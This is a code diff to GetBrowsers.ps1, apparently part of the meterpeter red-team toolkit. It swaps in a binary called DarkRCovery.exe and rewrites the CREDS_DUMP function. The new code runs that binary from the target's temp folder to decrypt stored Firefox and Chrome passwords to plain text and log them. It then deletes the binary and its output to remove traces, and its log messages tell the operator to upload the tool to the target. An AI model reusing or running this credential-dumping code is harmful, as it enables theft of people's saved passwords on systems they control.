@@ -4,7 +4,7 @@
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: (iexplore|msedge), Firefox, Chrome
-  Optional Dependencies: mozlz4-win32.exe, HackChrome.exe
+  Optional Dependencies: mozlz4-win32.exe, DarkRCovery.exe
   PS Script Dev Version: v1.18
 
 .DESCRIPTION
@@ -24,10 +24,10 @@
    url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 
    PS C:\> ./GetBrowsers.ps1 -CREDS
-   HackChrome.exe (Optional Dependencie)
-   Used to uncrypt chrome browser stored credentials to plain text
-   HackChrome requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
-   url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/HackChrome.exe
+   DarkRCovery.exe (Optional Dependencie by 0xyg3n)
+   Used to decrypt firefox|chrome browser stored credentials to plain text.
+   DarkRCovery requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
+   url: https://github.com/0xyg3n/ihadtohost/blob/master/DarkRCovery.exe
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1
@@ -67,7 +67,7 @@
 
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
-    https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/HackChrome.exe
+    https://github.com/0xyg3n/ihadtohost/blob/master/DarkRCovery.exe
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
@@ -854,24 +854,26 @@ function CREDS_DUMP {
     }
 
     ## Leak chrome creds
-    If(Test-Path "$env:tmp\HackChrome.exe"){
+    If(Test-Path "$env:tmp\DarkRCovery.exe"){
         $IPATH = pwd
-        cd $env:tmp;./HackChrome.exe > $env:tmp\leakcreds.txt
-        $storecreds = Get-Content "$env:tmp\leakcreds.txt"|findstr /I /V /C:"Total Auth:"
-        echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-        echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
-        # Remove old files
-        Remove-Item "$env:tmp\HackChrome.exe" -Force
-        Remove-Item "$env:tmp\leakcreds.txt" -Force
-        echo $storecreds >> $LogFilePath\BrowserEnum.log
+        cd $env:tmp;./DarkRCovery.exe
+        $storecreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
+        If(Test-Path "$env:tmp\Leaked.txt"){
+            echo "`n`n[ Firefox|Chrome ]" >> $LogFilePath\BrowserEnum.log
+            # Remove old files
+            Start-Sleep -Seconds 8 # Wait for DarkRcovery to finish ..
+            Remove-Item "$env:tmp\Leaked.txt" -Force
+            Remove-Item "$env:tmp\DarkRCovery.exe" -Force
+            echo $storecreds >> $LogFilePath\BrowserEnum.log
+        }else{
+            echo "[i] Not found: `$env:tmp\Leaked.txt" >> $LogFilePath\BrowserEnum.log
+        }
         cd $IPATH
     }else{
-        echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-        echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
-        echo "--------------------" >> $LogFilePath\BrowserEnum.log
-        echo "{Upload: meterpeter\mimiRatz\HackChrome.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
-        echo "{And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak chrome credentials}" >> $LogFilePath\BrowserEnum.log
-        echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome.exe}" >> $LogFilePath\BrowserEnum.log
+        echo "`n`n[ Firefox|Chrome ]" >> $LogFilePath\BrowserEnum.log
+        echo "{Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
+        echo "{And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials}" >> $LogFilePath\BrowserEnum.log
+        echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe}" >> $LogFilePath\BrowserEnum.log
     }
     
     ## Search for passwords in { ConsoleHost_history }
